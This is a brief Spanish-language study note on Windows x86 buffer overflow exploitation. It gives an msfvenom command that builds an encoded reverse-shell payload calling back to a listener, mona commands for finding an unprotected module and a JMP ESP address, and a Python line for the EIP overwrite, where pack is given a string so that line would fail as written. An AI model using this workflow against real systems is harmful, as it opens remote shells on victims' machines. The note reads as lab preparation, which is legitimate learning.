____
- tags: #buffer_overflow #esp #shell_code
___
## msfvenom
Emplea por defecto el encode de x86/shikata_ga_nai por defecto
### Listar payloads
```shell
msfvenom -l payloads
```
### comando
```shell
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.84 LPORT=443 -f py -e x86/shikata_ga_nai EXITFUNC=thread -b '\x00\x0a\x0d'
```
- -p 
	- payload
- --plataform
	- sistema operativo
- -a
	- arquitectura
- LHOST
	- Local Host
- LPORT
	- Local Port
- -f
	- formato
- -e 
	- encoder
- -b
	- badchars
- EXITFUNC
	- le digo que mate un subproceso en vez del proceso padre, para poder explotarlo nuevamente

### Mona

#### Buscamos un módulo en mona sin protecciones (primeras 4 columnas en false)
```shell
!mona modules
```

![[Pasted image 20251018191149.png]]

### Buscamos un jump ESP dentro del dll con una utilidad
```shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
```

![[Pasted image 20251018192429.png]]

#### con mona buscamos una dirección dentro del DLL
```shell
!mona find -s "\xFF\xE4" -m SLMFC.DLL
```

### cambiamos nuestro eip por la nueva dirección en el codigo .py
```python
from struct import pack

eip = pack("L", "0x5f4c4d13") # lo transforma a formato Little-endian
```
